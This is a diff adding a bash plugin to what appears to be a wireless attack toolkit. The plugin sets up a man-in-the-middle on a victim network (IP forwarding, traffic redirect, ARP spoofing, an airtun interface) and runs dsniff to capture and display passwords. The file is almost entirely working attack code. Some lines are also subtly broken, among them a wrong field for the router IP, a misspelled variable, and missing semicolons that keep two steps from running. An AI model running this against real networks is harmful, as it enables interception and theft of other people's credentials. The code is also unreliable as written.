@@ -1,0 +1,53 @@
+#!/bin/bash 
+# Copyright (2011) David Francos Cuartero, and some of the sources might be from other versions.
+# This is highly unmantained, as now is a plugin, you can easily modify it =)
+#        This program is free software; you can redistribute it and/or
+#        modify it under the terms of the GNU General Public License
+#        as published by the Free Software Foundation; either version 2
+#        of the License, or (at your option) any later version.
+
+#        This program is distributed in the hope that it will be useful,
+#        but WITHOUT ANY WARRANTY; without even the implied warranty of
+#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#        GNU General Public License for more details.
+
+#        You should have received a copy of the GNU General Public License
+#        Along with this program; if not, write to the Free Software
+#        Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+# Use this ON YOUR OWN NETWORKS, UNDER YOUR OWN RESPONSABILITY.
+# THIS IS A CRUDE ATTACK, YOU'RE PROBABLY GOING TO GET CAUGHT IF YOU MISUSE IT.
+p_menu+=("Sniff connections with dsniff")
+
+check_function enable_forwarding || source $path/plugins/forwarding
+check_function arpspoof || source $path/plugins/arpspoof
+check_function airtunmenu || source $path/attacks/others
+
+execute_dsniff(){
+     execute "Sniffing virtual interface" dsniff -i at0 -w /tmp/dsniff.keys
+     execute "Current passwords" tail -f /tmp/dsniff.keys
+}
+
+get_ip(){
+     dhclient at0 && {
+        target_router_ip=$(ip route list dev at0 |awk '/default/ { print $3}' );
+        target_ip=$(ip route list dev at0| awk '/src/ {print $7}' )
+     } || {
+        single_question "Cant configure network, enter 'Victim_ip,router_ip' "; 
+        target_ip=$(cut -d, -f1 <<< $ans)
+        target_router_ip=$(cut -d, -f1 <<< $ans) 
+     } 
+}
+
+Sniff_connections_with_dsniff(){
+    warn "$mark Enabling ip forwarding "; enable_forwarding
+    warn "$mark Enabling port redirect "; enable_traffic_redirect
+    warn "$mark Getting network ip address"; get_ip
+    warn "$mark Killing airtun to remove possible old at interfaces" clean_airtun
+    warn "$mark Launching airtun to create at0"; airtunmenu
+    warn "$mark Launching helpers defined in other plugins"; for i in "${dsniff_helpers[@]}"; do $i; done
+    warn "$mark Starting dsniff" execute_dsniff
+    warn "$mark Press enter to stop the attack"; read
+    disable_ip_forwarding; disable_traffic_redirect; killall dsniff ${dsniff_helpsers[@]}; clean_airtun
+}
+
+
